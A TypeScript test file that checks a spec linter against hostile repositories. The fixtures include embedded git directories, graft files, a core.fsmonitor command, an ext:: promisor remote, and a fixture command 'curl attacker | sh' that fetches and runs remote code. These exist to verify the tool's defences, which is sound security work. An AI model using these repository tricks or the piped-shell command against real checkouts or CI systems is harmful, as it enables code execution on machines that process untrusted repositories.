/**
 * The repository of a lint run is hostile input: a spec pull request can
 * commit files that look like a git directory, and a checkout's own
 * `.git/config` can name programs. None of it may move the reference state
 * or start a process.
 */
import fs from "node:fs";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { gitConfigOverrides } from "../../src/canonical/git-hardening.js";
import { lintSpecDir } from "../../src/lint/index.js";
import { git, runBounded, shimGit } from "../canonical/helpers.js";
import {
  REMOTE_MAIN,
  Repo,
  STATIC_PLAN,
  lintIn,
  ofRule,
  plainHistory,
  specFiles,
  usageError,
} from "./git-helpers.js";
import { scratch } from "./helpers.js";

const EVIL =
  'commands:\n  evil:\n    argv: ["sh", "-c", "curl attacker | sh"]\n';
const EVIL_PLAN = STATIC_PLAN.replace(
  "check_command_ref: typecheck",
  "check_command_ref: evil",
);

/**
 * A spec pull request that carries its own git directory: `specs/` holds
 * `HEAD`, `objects/`, `refs/`, `config` (and, with `graft`, `info/grafts`)
 * of a repository the author built, `core.worktree` pointing back at it.
 * Walking up from the spec directory finds that layout before the real
 * `.git`. The author's repository has a commit `x` with a command set of
 * their choosing, and either calls it the default branch or, with `graft`,
 * grafts it under the real default tip. `worktree` is the `core.worktree` of
 * the layout: `.` makes `specs/` its own work tree, `s1` puts the work tree
 * (the spec directory) below the git directory.
 */
async function embeddedLayout(graft: boolean, worktree = ".") {
  const { repo, c1 } = await plainHistory();
  const attacker = path.join(scratch(), "attacker");
  await git(scratch(), ["clone", "-q", repo.dir, attacker]);
  await git(attacker, ["checkout", "-q", "--orphan", "evil"]);
  await git(attacker, ["rm", "-rfq", "--cached", "."]);
  fs.rmSync(path.join(attacker, "README.md"), { force: true });
  fs.mkdirSync(path.join(attacker, ".spec-gate"), { recursive: true });
  fs.writeFileSync(path.join(attacker, ".spec-gate/commands.yaml"), EVIL);
  await git(attacker, ["add", "-A"]);
  await git(attacker, ["commit", "-q", "-m", "evil"], 5);
  const x = await git(attacker, ["rev-parse", "HEAD"]);

  const layout = path.join(repo.dir, "specs");
  fs.mkdirSync(layout, { recursive: true });
  fs.cpSync(
    path.join(attacker, ".git", "objects"),
    path.join(layout, "objects"),
    {
      recursive: true,
    },
  );
  fs.writeFileSync(path.join(layout, "HEAD"), "ref: refs/heads/main\n");
  const put = (ref: string, id: string) => {
    fs.mkdirSync(path.dirname(path.join(layout, ref)), { recursive: true });
    fs.writeFileSync(path.join(layout, ref), `${id}\n`);
  };
  put("refs/heads/main", graft ? c1 : x);
  put("refs/remotes/origin/main", graft ? c1 : x);
  if (graft) {
    fs.mkdirSync(path.join(layout, "info"));
    fs.writeFileSync(path.join(layout, "info/grafts"), `${c1} ${x}\n`);
  }
  fs.writeFileSync(
    path.join(layout, "config"),
    `[core]\n\trepositoryformatversion = 0\n\tbare = false\n\tworktree = ${worktree}\n`,
  );
  await repo.sh("add", "-A", "-f");
  await repo.commit(
    specFiles({ base: x, ref: x, plan: EVIL_PLAN }),
    "spec with an embedded git directory",
  );
  return { repo, c1, x };
}

describe("a git directory committed into the work tree", () => {
  for (const graft of [false, true]) {
    const name = graft ? "with info/grafts" : "with its own default branch";
    const flags = (c1: string) =>
      graft ? { base: c1 } : { defaultRef: REMOTE_MAIN };

    it(`is never found from the spec directory: a git input without --repo is a usage error (${name})`, async () => {
      const { repo, c1 } = await embeddedLayout(graft);
      for (const request of [
        flags(c1),
        { defaultRef: REMOTE_MAIN, base: c1 },
      ]) {
        const result = lintSpecDir(repo.spec, { git: request });
        expect(result.ok).toBe(false);
        expect(result.ok ? "" : result.message).toContain(
          "--repo <dir> is required",
        );
      }
    });

    it(`does not move the reference state: with --repo the real repository decides (${name})`, async () => {
      const { repo, c1, x } = await embeddedLayout(graft);
      const report = lintIn(repo, flags(c1), { final: true });
      expect(report.ok).toBe(false);
      expect(report.errors.map((f) => [f.rule, f.code])).toEqual(
        expect.arrayContaining([
          ["base-commit-not-ancestor", "not-a-commit"],
          ["commands-ref-not-ancestor", "not-a-commit"],
          ["static-command-unknown", "commands-ref-untrusted"],
        ]),
      );
      // the real repository answered: the evil commit is no object of it
      expect(await git(repo.dir, ["cat-file", "-t", c1])).toBe("commit");
      await expect(git(repo.dir, ["cat-file", "-e", x])).rejects.toThrow();
    });

    it(`is refused as --repo, named directly or from below (${name})`, async () => {
      const { repo, c1 } = await embeddedLayout(graft);
      for (const where of [
        path.join(repo.dir, "specs"),
        repo.spec,
        path.join(repo.dir, "specs", "objects"),
      ]) {
        const message = usageError(repo, { ...flags(c1), repo: where });
        // git's own bare-repository rule refuses the layout before the git
        // directory check is reached
        expect(message, where).toBe("--repo is not inside a git work tree");
      }
    });
  }

  it("git's own bare-repository rule already refuses the layout; the git directory check is the second line", async () => {
    const { repo } = await embeddedLayout(false);
    const where = path.join(repo.dir, "specs");
    const probe = (config: string[]) =>
      runBounded(
        "git",
        ["-C", where, ...config, "rev-parse", "--show-toplevel"],
        {
          env: Object.fromEntries(
            Object.entries(process.env).filter(([k]) => !k.startsWith("GIT_")),
          ),
        },
      );
    // without the setting git takes the layout for a repository whose work
    // tree is the directory itself
    const plain = await probe([]);
    expect(plain.code).toBe(0);
    expect(plain.stdout.trim()).toBe(fs.realpathSync(where));
    // with it git refuses before any of our code runs
    expect((await probe(["-c", "safe.bareRepository=explicit"])).code).toBe(
      128,
    );
  });
});

describe("on a git that ignores safe.bareRepository", () => {
  const saved = process.env["PATH"];
  afterEach(() => {
    process.env["PATH"] = saved;
  });

  for (const [worktree, where, why] of [
    [
      ".",
      "specs",
      "its git directory lies inside the work tree and is not its .git",
    ],
    ["s1", "specs/s1", "its work tree lies inside its git directory"],
  ] as const) {
    it(`the layout check refuses a committed git directory named as --repo (core.worktree = ${worktree})`, async () => {
      const { repo } = await embeddedLayout(false, worktree);
      const dir = path.join(repo.dir, where);
      const shim = shimGit(scratch(), {
        drop: ["safe.bareRepository=explicit"],
      });
      // control: through this git the layout is found from the directory
      const raw = await runBounded(
        "git",
        ["-C", dir, "rev-parse", "--show-toplevel"],
        {
          env: {
            ...Object.fromEntries(
              Object.entries(process.env).filter(
                ([k]) => !k.startsWith("GIT_"),
              ),
            ),
            PATH: shim.path,
          },
        },
      );
      expect(raw.code).toBe(0);
      expect(raw.stdout.trim()).toBe(
        fs.realpathSync(path.join(repo.dir, "specs", worktree)),
      );
      process.env["PATH"] = shim.path;
      expect(usageError(repo, { defaultRef: REMOTE_MAIN, repo: dir })).toBe(
        `--repo is not a plain git checkout: ${why}`,
      );
    });
  }

  it("a repository's protocol.<name>.allow does not start a transport for a lazy fetch", async () => {
    const { repo, c1 } = await plainHistory();
    const missing = "abcdefabcdefabcdefabcdefabcdefabcdefabcd";
    await repo.commit(
      specFiles({ base: missing, ref: c1, plan: STATIC_PLAN }),
      "spec naming an object the repository does not hold",
    );
    const markers = fs.mkdtempSync(path.join(scratch(), "ext-markers-"));
    const marker = path.join(markers, "ext-transport");
    // a promisor remote over ext:: that the repository itself allows
    await repo.sh("config", "core.repositoryformatversion", "1");
    await repo.sh("config", "extensions.partialClone", "evil");
    await repo.sh("config", "remote.evil.url", `ext::sh -c touch% ${marker}`);
    await repo.sh("config", "remote.evil.promisor", "true");
    await repo.sh("config", "remote.evil.partialclonefilter", "blob:none");
    await repo.sh("config", "protocol.ext.allow", "always");
    const probe = (extra: string[]) =>
      runBounded(
        "git",
        [
          "-C",
          repo.dir,
          ...extra,
          "cat-file",
          "-t",
          "--end-of-options",
          missing,
        ],
        {
          env: Object.fromEntries(
            Object.entries(process.env).filter(([k]) => !k.startsWith("GIT_")),
          ),
        },
      );
    // control: plain git asks the promisor remote for the missing object, and
    // with only the four overrides of the package it still does
    await probe([]);
    expect(fs.existsSync(marker)).toBe(true);
    fs.rmSync(marker);
    await probe(gitConfigOverrides());
    expect(fs.existsSync(marker)).toBe(true);
    fs.rmSync(marker);

    // a git that does not know GIT_NO_LAZY_FETCH
    process.env["PATH"] = shimGit(scratch(), {
      unset: ["GIT_NO_LAZY_FETCH"],
    }).path;
    const report = lintIn(repo, { defaultRef: REMOTE_MAIN }, { final: true });
    expect(ofRule(report, "base-commit-not-ancestor")).toHaveLength(1);
    expect(fs.existsSync(marker)).toBe(false);
  });
});

describe("the git directory of the repository in use", () => {
  it("a plain checkout, a subdirectory of it and a linked worktree are accepted", async () => {
    const { repo } = await plainHistory();
    await repo.commit(
      specFiles({ base: await repo.head(), ref: await repo.head() }),
      "spec",
    );
    expect(lintIn(repo, { defaultRef: REMOTE_MAIN }).errors).toEqual([]);
    expect(
      lintIn(repo, {
        defaultRef: REMOTE_MAIN,
        repo: path.join(repo.dir, "specs"),
      }).errors,
    ).toEqual([]);
    // a linked worktree keeps its git directory in the main repository
    const linked = path.join(scratch(), "linked");
    await repo.sh("worktree", "add", "-q", "--detach", linked, "HEAD");
    const result = lintSpecDir(path.join(linked, "specs/s1"), {
      git: { defaultRef: REMOTE_MAIN, repo: linked },
    });
    expect(result.ok).toBe(true);
    expect(result.ok ? result.report.errors : []).toEqual([]);
  });

  it("a git directory inside the work tree that is not its .git is refused, whatever git makes of it", async () => {
    const { repo } = await plainHistory();
    await repo.commit(
      specFiles({ base: await repo.head(), ref: await repo.head() }),
      "spec",
    );
    // `.git` is a file that points at a directory of the work tree itself
    fs.renameSync(path.join(repo.dir, ".git"), path.join(repo.dir, "gitstore"));
    fs.writeFileSync(path.join(repo.dir, ".git"), "gitdir: gitstore\n");
    expect(await repo.head()).toMatch(/^[0-9a-f]{40}$/);
    expect(usageError(repo, { defaultRef: REMOTE_MAIN })).toBe(
      "--repo is not a plain git checkout: its git directory lies inside the work tree and is not its .git",
    );
  });

  it("a linked worktree whose common directory lies inside its own work tree is refused", async () => {
    const { repo } = await plainHistory();
    await repo.commit(
      specFiles({ base: await repo.head(), ref: await repo.head() }),
      "spec",
    );
    const linked = path.join(scratch(), "linked-doctored");
    await repo.sh("worktree", "add", "-q", "--detach", linked, "HEAD");
    // the worktree's git directory stays outside the work tree, but its
    // commondir now names a copy of the repository that sits inside it
    const inner = path.join(linked, "common");
    fs.cpSync(path.join(repo.dir, ".git"), inner, { recursive: true });
    const wtDir = fs
      .readdirSync(path.join(repo.dir, ".git", "worktrees"))
      .map((n) => path.join(repo.dir, ".git", "worktrees", n))
      .find((d) =>
        fs
          .readFileSync(path.join(d, "gitdir"), "utf8")
          .startsWith(fs.realpathSync(linked)),
      )!;
    fs.writeFileSync(path.join(wtDir, "commondir"), `${inner}\n`);
    const result = lintSpecDir(path.join(linked, "specs/s1"), {
      git: { defaultRef: REMOTE_MAIN, repo: linked },
    });
    expect(result).toEqual({
      ok: false,
      message:
        "--repo is not a plain git checkout: its common git directory lies inside the work tree",
    });
  });
});

describe("the repository's own configuration", () => {
  /**
   * The setting of the checkout's own configuration that a read of the lint
   * can trigger: `core.fsmonitor` runs when git reads the index, as
   * `diff-tree` does. Measured against plain git, none of the lint's other
   * commands (`rev-parse`, `cat-file`, `ls-tree`, `show-ref`, `merge-base`,
   * `check-ref-format`) starts a program named by a diff driver, pager, hook,
   * ssh command or alternate-refs command, and `diff-tree` with the flags
   * the lint passes starts only the file system monitor, so those settings
   * are not part of the fixture: a marker for one of them could never appear
   * and its absence would prove nothing.
   */
  async function hostile(repo: Repo): Promise<string> {
    const markers = fs.mkdtempSync(path.join(scratch(), "markers-"));
    await repo.sh(
      "config",
      "core.fsmonitor",
      `touch ${markers}/fsmonitor; false`,
    );
    return markers;
  }

  /** The fixture is live: plain git, run the way the lint used to run it, starts the program. */
  async function control(repo: Repo, markers: string): Promise<void> {
    const env: NodeJS.ProcessEnv = {};
    for (const [k, v] of Object.entries(process.env)) {
      if (!k.startsWith("GIT_")) env[k] = v;
    }
    const run = await runBounded(
      "git",
      ["-C", repo.dir, "diff-tree", "-r", "--name-only", "HEAD~1", "HEAD"],
      { env },
    );
    expect(run.code).toBe(0);
    expect(fs.readdirSync(markers)).toContain("fsmonitor");
    for (const name of fs.readdirSync(markers)) {
      fs.rmSync(path.join(markers, name));
    }
  }

  it("does not run the file system monitor program the repository's configuration names, during a full run", async () => {
    const { repo, c1 } = await plainHistory();
    await repo.commit(
      specFiles({ base: c1, ref: c1, plan: STATIC_PLAN }),
      "spec",
    );
    const markers = await hostile(repo);
    await control(repo, markers);
    for (const request of [
      { defaultRef: REMOTE_MAIN },
      { base: c1 },
      { defaultRef: REMOTE_MAIN, base: c1 },
    ]) {
      const report = lintIn(repo, request, { final: true });
      expect(report.errors, JSON.stringify(request)).toEqual([]);
      expect(fs.readdirSync(markers)).toEqual([]);
    }
  });
});

describe("a graft file", () => {
  it("does not make a side commit an ancestor of the reference commit", async () => {
    const { repo, c1 } = await plainHistory();
    await repo.checkout("island", c1);
    await repo.sh("checkout", "-q", "--orphan", "side");
    const side = await repo.commit({ "side.txt": "s\n" }, "unrelated");
    await repo.checkout("pr2", c1);
    await repo.commit(
      specFiles({ base: side, ref: side, plan: STATIC_PLAN }),
      "spec naming the side commit",
    );
    const before = lintIn(repo, { defaultRef: REMOTE_MAIN });
    expect(ofRule(before, "base-commit-not-ancestor")).toHaveLength(1);
    // the author's graft file claims the default tip descends from the side commit
    fs.mkdirSync(path.join(repo.dir, ".git/info"), { recursive: true });
    fs.writeFileSync(
      path.join(repo.dir, ".git/info/grafts"),
      `${c1} ${side}\n`,
    );
    // control: plain git believes it
    const plain = await runBounded(
      "git",
      ["-C", repo.dir, "merge-base", "--is-ancestor", side, c1],
      {
        env: Object.fromEntries(
          Object.entries(process.env).filter(([k]) => !k.startsWith("GIT_")),
        ),
      },
    );
    expect(plain.code).toBe(0);
    for (const request of [{ defaultRef: REMOTE_MAIN }, { base: c1 }]) {
      const report = lintIn(repo, request);
      expect(
        ofRule(report, "base-commit-not-ancestor"),
        JSON.stringify(request),
      ).toEqual([expect.objectContaining({ code: "not-ancestor" })]);
      expect(ofRule(report, "commands-ref-not-ancestor")).toHaveLength(1);
    }
  });
});

describe("--base and --default-ref together", () => {
  it("--base must be an ancestor of, or equal to, the default branch commit", async () => {
    const { repo, c0, c1 } = await plainHistory();
    await repo.commit(specFiles({ base: c1, ref: c1 }), "spec");
    // a commit on a branch of the author's own, never merged
    await repo.checkout("side", c1);
    const side = await repo.commit({ "side.txt": "s\n" }, "side");
    await repo.checkout("pr3", c1);
    await repo.commit(specFiles({ base: c1, ref: c1 }), "spec again");
    const message = "--base is not on --default-ref";
    expect(usageError(repo, { defaultRef: REMOTE_MAIN, base: side })).toBe(
      message,
    );
    // equal and older are fine; --base is the reference commit
    expect(lintIn(repo, { defaultRef: REMOTE_MAIN, base: c1 }).errors).toEqual(
      [],
    );
    expect(
      ofRule(
        lintIn(repo, { defaultRef: REMOTE_MAIN, base: c0 }),
        "base-commit-not-ancestor",
      ),
    ).toHaveLength(1);
    // each flag alone is not subject to the check
    expect(lintIn(repo, { base: side }).ok).toBe(true);
    // a --default-ref that is itself bad is still reported first
    expect(
      usageError(repo, { defaultRef: "refs/heads/nope", base: side }),
    ).toContain("--default-ref");
  });
});
